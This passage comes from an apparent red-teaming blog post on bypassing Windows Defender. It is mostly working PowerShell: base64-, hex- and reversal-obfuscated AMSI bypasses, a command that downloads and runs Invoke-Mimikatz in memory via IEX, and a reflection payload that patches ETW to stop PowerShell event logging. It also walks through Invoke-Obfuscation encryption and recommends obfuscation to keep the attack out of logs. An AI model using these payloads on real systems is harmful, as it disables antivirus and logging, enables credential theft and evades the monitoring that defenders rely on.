class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'YQBtAHMAaQA='</span><span class="p">))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">(</span><span class="err">$</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'SQBuAGkAdAA='</span><span class="p">))))</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'RgBhAGkAbABlAGQA'</span><span class="p">)))),</span><span class="err">$</span><span class="p">(</span><span class="s1">'NonPublic,Static'</span><span class="p">))</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><ul><li>For confirmation, we can download and execute <code class="language-plaintext highlighter-rouge">Mimikatz.ps1</code> in the memory and check if its triggering Defender.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">IEX</span><span class="p">(</span><span class="n">iwr</span><span class="w"> </span><span class="nt">-uri</span><span class="w"> </span><span class="nx">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/72c3622a-8fd5-4b59-9cdd-594049afd9fe" alt="image" data-proofer-ignore></p><p>As you can see, we successfully encoded the AMSI bypass payload in base64. Below I will give a demonstration on how to encode it in hex and use techniques like reverse string and concatenation</p><h3 id="concatenation"><span class="mr-2"><span style="color:pink"><span class="mr-2">Concatenation</span></span><a href="#concatenation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>An easy was of bypassing <strong>‚ÄúA m s i U t i l s‚Äù</strong> is by simply splitting it into two words and adding them together.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="s1">'AmsiUtils'</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="s1">'Amsi'</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">'Utils'</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/2600288f-d266-48b5-af41-f9b96e488368" alt="image" data-proofer-ignore></p><h3 id="hex-encoding"><span class="mr-2"><span style="color:pink"><span class="mr-2">Hex Encoding</span></span><a href="#hex-encoding" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>A simple Hex encoding and decoding snippet in PowerShell looks like this :</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c"># Encoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="s2">"Hello World"</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-Hex</span><span class="w">

</span><span class="c"># Decoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'48 65 6C 6C 6F 20 57 6F 72 6C 64'</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span><span class="o">|</span><span class="kr">forEach</span><span class="p">{[</span><span class="n">char</span><span class="p">]([</span><span class="n">convert</span><span class="p">]::</span><span class="n">toint16</span><span class="p">(</span><span class="bp">$_</span><span class="p">,</span><span class="mi">16</span><span class="p">))}</span><span class="o">|</span><span class="kr">forEach</span><span class="p">{</span><span class="nv">$s</span><span class="o">=</span><span class="nv">$s</span><span class="o">+</span><span class="bp">$_</span><span class="p">}</span><span class="w"> 
</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$s</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/e6246d82-274e-4793-bdf7-11c3a90aaa0d" alt="image" data-proofer-ignore></p><h3 id="reverse-string"><span class="mr-2"><span style="color:pink"><span class="mr-2">Reverse String</span></span><a href="#reverse-string" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The last technique is by reversing the string for obfuscating the payload.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="c"># Encoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(([</span><span class="n">regex</span><span class="p">]::</span><span class="n">Matches</span><span class="p">(</span><span class="s2">"testing payload"</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'RightToLeft'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kr">foreach</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">value</span><span class="p">})</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">''</span><span class="p">)</span><span class="w">

</span><span class="c"># Decoding Payload</span><span class="w">
</span><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="p">(([</span><span class="n">regex</span><span class="p">]::</span><span class="n">Matches</span><span class="p">(</span><span class="s2">"daolyap gnitset"</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'RightToLeft'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kr">foreach</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">value</span><span class="p">})</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">''</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/bd5caded-ebae-4f29-a8fa-31eb49e8bed1" alt="image" data-proofer-ignore></p><h2 id="final-payload---2"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Final Payload - 2</span></span><a href="#final-payload---2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We can also combine these techniques to create a more powerful and effective payload that can evade detection by Windows Defender. Using a combination of Base64 Encoding, Hex Encoding, Reversing The String, and Concatenation, we can create a highly obfuscated payload to bypass Windows Defender.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nv">$w</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'System.Manag'</span><span class="p">;</span><span class="nv">$r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'65 6d 65 6e 74 2e 41 75 74 6f 6d 61 74 69 6f 6e 2e'</span><span class="o">.</span><span class="nf">Split</span><span class="p">(</span><span class="s2">" "</span><span class="p">)</span><span class="o">|</span><span class="kr">forEach</span><span class="p">{[</span><span class="n">char</span><span class="p">]([</span><span class="n">convert</span><span class="p">]::</span><span class="n">toint16</span><span class="p">(</span><span class="bp">$_</span><span class="p">,</span><span class="mi">16</span><span class="p">))}</span><span class="o">|</span><span class="kr">forEach</span><span class="p">{</span><span class="nv">$s</span><span class="o">=</span><span class="nv">$s</span><span class="o">+</span><span class="bp">$_</span><span class="p">};</span><span class="nv">$c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'Amsi'</span><span class="o">+</span><span class="s1">'Utils'</span><span class="p">;</span><span class="nv">$assembly</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">((</span><span class="s1">'{0}{1}{2}'</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nv">$w</span><span class="p">,</span><span class="nv">$s</span><span class="p">,</span><span class="nv">$c</span><span class="p">));</span><span class="nv">$n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="p">([</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetString</span><span class="p">([</span><span class="n">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="s1">'YQBtAA=='</span><span class="p">)));</span><span class="nv">$b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'siIn'</span><span class="p">;</span><span class="nv">$k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(([</span><span class="n">regex</span><span class="p">]::</span><span class="n">Matches</span><span class="p">(</span><span class="s2">"deliaFti"</span><span class="p">,</span><span class="s1">'.'</span><span class="p">,</span><span class="s1">'RightToLeft'</span><span class="p">)</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="kr">foreach</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">value</span><span class="p">})</span><span class="w"> </span><span class="o">-join</span><span class="w"> </span><span class="s1">''</span><span class="p">);</span><span class="nv">$field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$assembly</span><span class="o">.</span><span class="nf">GetField</span><span class="p">((</span><span class="s1">'{0}{1}{2}'</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nv">$n</span><span class="p">,</span><span class="nv">$b</span><span class="p">,</span><span class="nv">$k</span><span class="p">),</span><span class="s1">'NonPublic,Static'</span><span class="p">);</span><span class="nv">$field</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">,</span><span class="bp">$true</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/d45a6949-de22-458f-b69e-2ced47026585" alt="image" data-proofer-ignore></p><h1 id="patching-event-tracing-for-windows"><span style="color:lightblue">Patching Event Tracing for Windows</span></h1><p>Event Tracing for Windows (ETW) is a powerful logging and tracing mechanism in the Windows operating system that allows developers, administrators, and analysts to monitor and diagnose system events in real time. It collects and analyses diagnostic and performance data from applications and services running on Windows. ETW records events generated by the operating system and applications, including information on processes, threads, disk I/O, network activity, and more.</p><p>By disabling or manipulating ETW, attackers can prevent security tools from logging their actions or tracking their movement within a system.</p><blockquote><p>Original Payload to patch ETW</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="n">Reflection.Assembly</span><span class="p">]::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">'System.Core'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Diagnostics.Eventing.EventProvider'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'m_enabled'</span><span class="p">,</span><span class="s1">'NonPublic,Instance'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">([</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Tracing.PSEtwLogProvider'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'etwProvider'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">),</span><span class="nx">0</span><span class="p">)</span><span class="w">
</span></pre></table></code></div></div></blockquote><h2 id="understanding-the-command-1"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Understanding the command</span></span><a href="#understanding-the-command-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This command is used to modify the behavior of the Event Tracing for Windows(ETW) in PowerShell. Specifically, it sets a private, static field within the <em>System.Management.Automation.Tracing.PSEtwLogProvider</em> class called <code class="language-plaintext highlighter-rouge">"m_enabled"</code> to true, <code class="language-plaintext highlighter-rouge">0</code> indicates that the initialization of ETW is disabled.</p><p>Here is a breakdown of the command and what each part does:</p><ol><li><code class="language-plaintext highlighter-rouge">[Reflection.Assembly]::LoadWithPartialName('System.Core')</code> loads the <code class="language-plaintext highlighter-rouge">System.Core</code> assembly into memory.<li><code class="language-plaintext highlighter-rouge">.GetType('System.Diagnostics.Eventing.EventProvider')</code> retrieves the <code class="language-plaintext highlighter-rouge">EventProvider</code> type from the loaded assembly.<li><code class="language-plaintext highlighter-rouge">.GetField('m_enabled','NonPublic,Instance')</code> retrieves the <code class="language-plaintext highlighter-rouge">m_enabled</code> field of the <strong>EventProvider</strong> type, which determines whether event tracing is enabled for that provider.<li><code class="language-plaintext highlighter-rouge">.SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)</code> sets the <code class="language-plaintext highlighter-rouge">m_enabled</code> field of the PowerShell ETW provider to <code class="language-plaintext highlighter-rouge">0</code> (disabled). This prevents PowerShell from logging events to the Windows Event Log or other ETW consumers.</ol><h2 id="patching-etw"><span class="mr-2"><span style="color:lightgreen"><span class="mr-2">Patching ETW</span></span><a href="#patching-etw" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>We have already learned how to patch PowerShell scripts manually. I will explain how to obfuscate Powershell using <strong>Invoke-Obfuscation</strong> for this example. I already have this setup on my Commando-VM.</p><ul><li>First thing is that we can launch <strong>Invoke-Obfuscation</strong></ul><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/c642ce31-8cd8-49f4-a70f-6d5ce9dd2a06" alt="image" data-proofer-ignore></p><ul><li>We can set our payload and use AES encryption to encrypt our payload.</ul><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Invoke-Obfuscation</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">SET</span><span class="w"> </span><span class="nx">SCRIPT</span><span class="w"> </span><span class="nx">BLOCK</span><span class="w"> </span><span class="p">[</span><span class="n">Reflection.Assembly</span><span class="p">]::</span><span class="nx">LoadWithPartialName</span><span class="p">(</span><span class="s1">'System.Core'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Diagnostics.Eventing.EventProvider'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'m_enabled'</span><span class="p">,</span><span class="s1">'NonPublic,Instance'</span><span class="p">)</span><span class="o">.</span><span class="nf">SetValue</span><span class="p">([</span><span class="n">Ref</span><span class="p">]</span><span class="o">.</span><span class="nf">Assembly</span><span class="o">.</span><span class="nf">GetType</span><span class="p">(</span><span class="s1">'System.Management.Automation.Tracing.PSEtwLogProvider'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetField</span><span class="p">(</span><span class="s1">'etwProvider'</span><span class="p">,</span><span class="s1">'NonPublic,Static'</span><span class="p">)</span><span class="o">.</span><span class="nf">GetValue</span><span class="p">(</span><span class="bp">$null</span><span class="p">),</span><span class="nx">0</span><span class="p">)</span><span class="w">

</span><span class="n">Invoke-Obfuscation</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ENCODING</span><span class="w">
</span><span class="n">Invoke-Obfuscation</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ENCODING\5</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/a3c9c816-38ab-4582-b72c-5005e1f85193" alt="image" data-proofer-ignore></p><ul><li>The encrypted payload will be visible at the end of the screen.</ul><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/9f11eac3-2246-43ad-8170-962a1dcc1e85" alt="image" data-proofer-ignore></p><ul><li>Now we can execute the payload. Before doing that, we need to understand why we have encrypted the payload and what the payload does. First, lets directly execute the payload.</ul><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/5a6c41bb-91dc-46eb-bb0d-4c7528e87721" alt="image" data-proofer-ignore></p><ul><li>As we can see that Defender has detected our encrypted payload, this is because it‚Äôs encryption which will be decrypted and get executed. Hence will help in bypassing Static analysis only. We can better understand if we execute the command without executing it.</ul><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/89b97d00-0dec-4985-93e4-20de83a3212b" alt="image" data-proofer-ignore></p><ul><li>To circumvent this security measure, we can bypass AMSI and then execute the desired command.</ul><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/14645a88-363c-46d7-8294-d953f3ed8b9a" alt="image" data-proofer-ignore></p><ul><li>It‚Äôs worth noting that while we can bypass AMSI and execute the raw payload to disable ETW, doing so may result in detecting and logging the attack in the PowerShell history file. As a result, it is recommended to use additional techniques such as encoding or obfuscation to evade detection and prevent attack logging.</ul><p><img data-src="https://github.com/0xStarlight/0xStarlight/assets/59029171/39465655-54a6-4dba-97fe-481c54b0346b" alt="image" data-proofer-ignore></p><h1 id="tools-used"><span style="color:lightblue">Tools Used</span></h1><ol><li><a href="https://github.com/RythmStick/AMSITrigger">AmsiTrigger</a><li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-obfuscation</a></ol><p>If you find my articles interesting, you can buy me a coffee</p><p><a href="https://www.buymeacoffee.com/0xStarlight"><img data-src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&amp;emoji=&amp;slug=0xStarlight&amp;button_colour=b86e19&amp;font_colour=ffffff&amp;font_family=Poppins&amp;outline_colour=ffffff&amp;coffee_colour=FFDD00" data-proofer-ignore></a></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/red-teaming/'>Red-Teaming</a>, <a href='/categories/defender-bypass/'>Defender-bypass</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active-directory</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/amsi-bypass/" class="post-tag no-text-decoration" >amsi-bypass</a> <a href="/tags/etw-bypass/" class="post-tag no-text-decoration" >etw-bypass</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Bypassing Windows Defender - 0xStarlight&amp;url=https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Bypassing Windows Defender - 0xStarlight&amp;u=https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://0xstarlight.github.io/posts/Bypassing-Windows-Defender/&amp;text=Bypassing Windows Defender - 0xStarlight" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Active-Directory-Domain-Persistence/">Active Directory - Domain Persistence</a><li><a href="/posts/Active-Directory-Lateral-Movement/">Active Directory - Lateral Movement</a><li><a href="/posts/Active-Directory-Introduction/">Active Directory - Introduction</a><li><a href="/posts/CRTE-Exam-Review/">CRTE Exam Review</a><li><a href="/posts/Bypassing-Windows-Defender/">Bypassing Windows Defender</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Offensive-powershell/"><div class="card-body"> <em class="timeago small" data-ts="1648612260" > 2022-03-30 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Offensive PowerShell</h3><div class="text-muted small"><p> Introduction Welcome to my second article in the Red Teaming Series (Offensive PowerShell). I hope everyone has gone through the first article of this series which explains the basic foundations...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Lateral-Movement/"><div class="card-body"> <em class="timeago small" data-ts="1649404500" > 2022-04-08 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Lateral Movement</h3><div class="text-muted small"><p> Introduction Welcome to my fourth article in the Red Teaming Series (Active Directory Lateral Movement). I hope everyone has gone through the previous articles of this series which go through th...</p></div></div></a></div><div class="card"> <a href="/posts/Active-Directory-Domain-Persistence/"><div class="card-body"> <em class="timeago small" data-ts="1649554500" > 2022-04-10 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Active Directory - Domain Persistence</h3><div class="text-muted small"><p> Introduction Welcome to my fifth article in the Red Teaming Series (Active Directory Domain Persistence). I hope everyone has gone through the previous articles of this series which go through t...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Active-Diretory-Forest-Trust-Abuse/" class="btn btn-outline-primary" prompt="Older"><p>Active Directory - Forest Trust Abuse</p></a> <a href="/posts/CRTE-Exam-Review/" class="btn btn-outline-primary" prompt="Newer"><p>CRTE Exam Review</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2024 <a href="https://twitter.com/Bhaskarpal__">Bhaskar Pal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/amsi-bypass/">amsi-bypass</a> <a class="post-tag" href="/tags/password-reuse/">password-reuse</a> <a class="post-tag" href="/tags/acl-enumeration/">ACL-enumeration</a> <a class="post-tag" href="/tags/active-directory-domain-persistence/">active-directory-domain-persistence</a> <a class="post-tag" href="/tags/active-directory-enumeration/">active-directory-enumeration</a> <a class="post-tag" href="/tags/active-directory-introduction/">active-directory-introduction</a> <a class="post-tag" href="/tags/active-directory-lateral-movement/">active-directory-lateral-movement</a> <a class="post-tag" href="/tags/active-directory-local-privilege-escalation/">active-directory-local-privilege-escalation</a> <a class="post-tag" href="/tags/as-rep/">AS-REP</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-GZYBNZRQNP"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-GZYBNZRQNP'); }); </script>
